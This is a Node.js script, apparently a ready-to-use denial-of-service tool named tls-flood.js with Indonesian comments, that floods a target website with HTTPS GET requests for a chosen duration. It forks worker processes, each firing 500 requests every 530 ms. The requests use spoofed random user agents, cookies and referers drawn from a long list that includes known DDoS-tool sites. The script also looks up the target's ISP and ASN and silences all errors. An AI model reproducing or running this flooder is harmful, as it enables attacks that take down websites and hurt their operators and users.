const https = require("https");
const url = require("url");
const cluster = require("cluster");
const axios = require("axios");

// Validasi input
if (process.argv.length < 4) {
  console.log(`Usage: node tls-flood.js URL TIME\nExample: node tls-flood.js https://example.com 300`);
  process.exit();
}

const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
};

const parsedTarget = url.parse(args.target);

// Daftar Referer
const referers = [
  "https://google.com", "https://yahoo.com", "https://bing.com",
  "https://duckduckgo.com", "https://example.com", "https://stackoverflow.com",
  "https://github.com", "https://wikipedia.org", "https://microsoft.com",
  "https://apple.com", "https://amazon.com", "https://facebook.com",  "https://google.com", "https://yahoo.com", "https://bing.com",
  "https://duckduckgo.com", "https://example.com", "https://stackoverflow.com","http://example.com", "http://test.com", "https://google.com", "https://yahoo.com", "https://bing.com", "https://www.google.com/search?q=",
 "https://check-host.net/",
 "https://www.facebook.com/",
 "https://www.youtube.com/",
 "https://www.fbi.com/",
 "https://www.bing.com/search?q=",
 "https://r.search.yahoo.com/",
 "https://www.cia.gov/index.html",
 "https://vk.com/profile.php?redirect=",
 "https://www.usatoday.com/search/results?q=",
 "https://help.baidu.com/searchResult?keywords=",
 "https://steamcommunity.com/market/search?q=",
 "https://www.ted.com/search?q=",
 "https://play.google.com/store/search?q=",
 "https://www.qwant.com/search?q=",
 "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
 "https://www.google.ad/search?q=",
 "https://www.google.ae/search?q=",
 "https://www.google.com.af/search?q=",
 "https://www.google.com.ag/search?q=",
 "https://www.google.com.ai/search?q=",
 "https://www.google.al/search?q=",
 "https://www.google.am/search?q=",
 "https://www.google.co.ao/search?q=",
 "http://anonymouse.org/cgi-bin/anon-www.cgi/",
 "http://coccoc.com/search#query=",
 "http://ddosvn.somee.com/f5.php?v=",
 "http://engadget.search.aol.com/search?q=",
 "http://engadget.search.aol.com/search?q=query?=query=&q=",
 "http://eu.battle.net/wow/en/search?q=",
 "http://filehippo.com/search?q=",
 "http://funnymama.com/search?q=",
 "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
 "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
 "http://go.mail.ru/search?mail.ru=1&q=",
 "http://help.baidu.com/searchResult?keywords=",
 "http://host-tracker.com/check_page/?furl=",
 "http://itch.io/search?q=",
 "http://jigsaw.w3.org/css-validator/validator?uri=",
 "http://jobs.bloomberg.com/search?q=",
 "http://jobs.leidos.com/search?q=",
 "http://jobs.rbs.com/jobs/search?q=",
 "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
 "http://louis-ddosvn.rhcloud.com/f5.html?v=",
 "http://millercenter.org/search?q=",
 "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
 "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
 "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
 "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
 "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
 "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
 "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
 "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
 "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
 "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
 "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
 "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
 "http://search.aol.com/aol/search?q=",
 "http://taginfo.openstreetmap.org/search?q=",
 "http://techtv.mit.edu/search?q=",
 "http://validator.w3.org/feed/check.cgi?url=",
 "http://vk.com/profile.php?redirect=",
 "http://www.ask.com/web?q=",
 "http://www.baoxaydung.com.vn/news/vn/search&q=",
 "http://www.bestbuytheater.com/events/search?q=",
 "http://www.bing.com/search?q=",
 "http://www.evidence.nhs.uk/search?q=",
 "http://www.google.com/?q=",
 "http://www.google.com/translate?u=",
 "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
 "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
 "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
 "http://www.pagescoring.com/website-speed-test/?url=",
 "http://www.reddit.com/search?q=",
 "http://www.search.com/search?q=",
 "http://www.shodanhq.com/search?q=",
 "http://www.ted.com/search?q=",
 "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
 "http://www.usatoday.com/search/results?q=",
 "http://www.ustream.tv/search?q=",
 "http://yandex.ru/yandsearch?text=",
 "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
 "http://ytmnd.com/search?q=",
 "https://add.my.yahoo.com/rss?url=",
 "https://careers.carolinashealthcare.org/search?q=",
 "https://check-host.net/",
 "https://developers.google.com/speed/pagespeed/insights/?url=",
 "https://drive.google.com/viewerng/viewer?url=",
 "https://duckduckgo.com/?q=",
 "https://google.com/",
 "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
 "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
 "https://help.baidu.com/searchResult?keywords=",
 "https://play.google.com/store/search?q=",
 "https://pornhub.com/",
 "https://r.search.yahoo.com/",
 "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
 "https://steamcommunity.com/market/search?q=",
 "https://vk.com/profile.php?redirect=",
 "https://www.bing.com/search?q=",
 "https://www.cia.gov/index.html",
 "https://www.facebook.com/",
 "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
 "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
 "https://www.fbi.com/",
 "https://www.google.ad/search?q=",
 "https://www.google.ae/search?q=",
 "https://www.google.al/search?q=",
 "https://www.google.co.ao/search?q=",
 "https://www.google.com.af/search?q=",
 "https://www.google.com.ag/search?q=",
 "https://www.google.com.ai/search?q=",
 "https://www.google.com/search?q=",
 "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
 "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
 "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
 "https://www.npmjs.com/search?q=",
 "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
 "https://www.pinterest.com/search/?q=",
 "https://www.qwant.com/search?q=",
 "https://www.ted.com/search?q=",
 "https://www.usatoday.com/search/results?q=",
 "https://www.yandex.com/yandsearch?text=",
 "https://www.youtube.com/",
 "https://yandex.ru/",
   'http://anonymouse.org/cgi-bin/anon-www.cgi/',
   'http://coccoc.com/search#query=',
   'http://ddosvn.somee.com/f5.php?v=',
   'http://engadget.search.aol.com/search?q=',
   'http://engadget.search.aol.com/search?q=query?=query=&q=',
   'http://eu.battle.net/wow/en/search?q=',
   'http://filehippo.com/search?q=',
   'http://funnymama.com/search?q=',
   'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
   'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
   'http://go.mail.ru/search?mail.ru=1&q=',
   'http://help.baidu.com/searchResult?keywords=',
   'http://host-tracker.com/check_page/?furl=',
   'http://itch.io/search?q=',
   'http://jigsaw.w3.org/css-validator/validator?uri=',
   'http://jobs.bloomberg.com/search?q=',
   'http://jobs.leidos.com/search?q=',
   'http://jobs.rbs.com/jobs/search?q=',
   'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
   'http://louis-ddosvn.rhcloud.com/f5.html?v=',
   'http://millercenter.org/search?q=',
   'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
   'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
   'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
   'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
   'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
   'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
   'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
   'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
   'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
   'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
   'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
   'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
   'http://search.aol.com/aol/search?q=',
   'http://taginfo.openstreetmap.org/search?q=',
   'http://techtv.mit.edu/search?q=',
   'http://validator.w3.org/feed/check.cgi?url=',
   'http://vk.com/profile.php?redirect=',
   'http://www.ask.com/web?q=',
   'http://www.baoxaydung.com.vn/news/vn/search&q=',
   'http://www.bestbuytheater.com/events/search?q=',
   'http://www.bing.com/search?q=',
   'http://www.evidence.nhs.uk/search?q=',
   'http://www.google.com/?q=',
   'http://www.google.com/translate?u=',
   'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
   'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
   'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
   'http://www.pagescoring.com/website-speed-test/?url=',
   'http://www.reddit.com/search?q=',
   'http://www.search.com/search?q=',
   'http://www.shodanhq.com/search?q=',
   'http://www.ted.com/search?q=',
   'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
   'http://www.usatoday.com/search/results?q=',
   'http://www.ustream.tv/search?q=',
   'http://yandex.ru/yandsearch?text=',
   'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
   'http://ytmnd.com/search?q=',
   'https://add.my.yahoo.com/rss?url=',
   'https://careers.carolinashealthcare.org/search?q=',
   'https://check-host.net/',
   'https://developers.google.com/speed/pagespeed/insights/?url=',
   'https://drive.google.com/viewerng/viewer?url=',
   'https://duckduckgo.com/?q=',
   'https://google.com/',
   'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
   'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
   'https://help.baidu.com/searchResult?keywords=',
   'https://play.google.com/store/search?q=',
   'https://pornhub.com/',
   'https://r.search.yahoo.com/',
   'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
   'https://steamcommunity.com/market/search?q=',
   'https://vk.com/profile.php?redirect=',
   'https://www.bing.com/search?q=',
   'https://www.cia.gov/index.html',
   'https://www.facebook.com/',
   'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
   'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
   'https://www.fbi.com/',
   'https://www.google.ad/search?q=',
   'https://www.google.ae/search?q=',
   'https://www.google.al/search?q=',
   'https://www.google.co.ao/search?q=',
   'https://www.google.com.af/search?q=',
   'https://www.google.com.ag/search?q=',
   'https://www.google.com.ai/search?q=',
   'https://www.google.com/search?q=',
   'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
   'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
   'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
   'https://www.npmjs.com/search?q=',
   'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
   'https://www.pinterest.com/search/?q=',
   'https://www.qwant.com/search?q=',
   'https://www.ted.com/search?q=',
   'https://www.usatoday.com/search/results?q=',
   'https://www.yandex.com/yandsearch?text=',
   'https://www.youtube.com/',
   'https://yandex.ru/',
   'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',
];

// Cipher Suites
const cipherSuites = [
  "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256",
];

// Generator karakter acak untuk cookie
function generateRandomString(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// Generator User-Agent acak
function generateFakeUserAgent() {
  const browsers = [
  "Chrome", 
  "Firefox", 
  "Safari", 
  "Edge", 
  "Opera", 
  "Brave", 
  "Vivaldi", 
  "Internet Explorer", 
  "Samsung Internet", 
  "UC Browser", 
  "Yandex Browser", 
  "DuckDuckGo Browser"
];
  const os = [
  "Windows NT 10.0", 
  "Windows NT 6.1", 
  "Windows NT 6.0", 
  "Windows NT 5.1", 
  "Windows NT 5.0", 
  "Macintosh", 
  "Mac OS X", 
  "Linux", 
  "X11; Linux x86_64", 
  "Ubuntu", 
  "Debian", 
  "Fedora", 
  "CentOS", 
  "Android", 
  "iPhone", 
  "iPad", 
  "iOS", 
  "Windows Phone", 
  "BlackBerry", 
  "Chrome OS"
];
  return `Mozilla/5.0 (${randomElement(os)}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomElement(
    browsers
  )}/91.0 Safari/537.36`;
}

// Pilih elemen acak dari array
function randomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// Flood Function
function sendFlood() {
  try {
    const userAgent = generateFakeUserAgent();
    const cookie = `session=${generateRandomString(64)}; id=${generateRandomString(32)}`;
    const referer = randomElement(referers);

    const options = {
      hostname: parsedTarget.hostname,
      port: 443,
      path: parsedTarget.path || "/",
      method: "GET",
      headers: {
        "User-Agent": userAgent,
        Cookie: cookie,
        Referer: referer,
        Accept: "*/*",
        Connection: "Keep-Alive",
        "Accept-Encoding": "gzip, deflate, br",
      },
      ciphers: cipherSuites.join(":"),
      honorCipherOrder: true,
      rejectUnauthorized: false,
    };

    const req = https.request(options, (res) => {
      const time = new Date().toLocaleTimeString();
      console.log(`[${time}] 迪克-GETSUOZHIRO 👹: ${userAgent}`);
      res.on("data", () => {});
      res.on("end", () => {});
    });

    req.on("error", (err) => console.error("Request error:", err.message));
    req.end();
  } catch (err) {
    console.error("Flood error:", err.message);
  }
}

// Multi-threading dengan cluster
if (cluster.isMaster) {
  console.log("Flood started...");
  console.log(`Target: ${args.target}`);
  console.log(`Duration: ${args.time}s`);

  // Tambahan: Ambil data ISP, IP, dan ASN
  (async () => {
    try {
      const response = await axios.get(`https://ipinfo.io/${parsedTarget.hostname}/json`);
      console.log(`
Host     : ${args.target}
Duration : ${args.time}s
Methods  : TLS
ISP      : ${response.data.org || "N/A"}
IP       : ${response.data.ip || "N/A"}
AS       : ${response.data.as || "N/A"}
`);
    } catch (error) {
      console.log(`
Host     : ${args.target}
Duration : ${args.time}s
Methods  : TLS
ISP      : N/A
IP       : N/A
AS       : N/A
`);
    }
  })();

  for (let i = 0; i < 4; i++) {
    cluster.fork();
  }
} else {
  let count = 0;

  const interval = setInterval(() => {
    if (count >= args.time) {
      clearInterval(interval);
      process.exit();
    }

    for (let i = 0; i < 500; i++) {
      sendFlood();
    }

    count++;
  }, 530); // Kirim 20 request setiap 1 detik
}

// Hentikan script setelah waktu selesai
setTimeout(() => {
  process.exit(1);
}, args.time * 1000);

// Tangani error
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});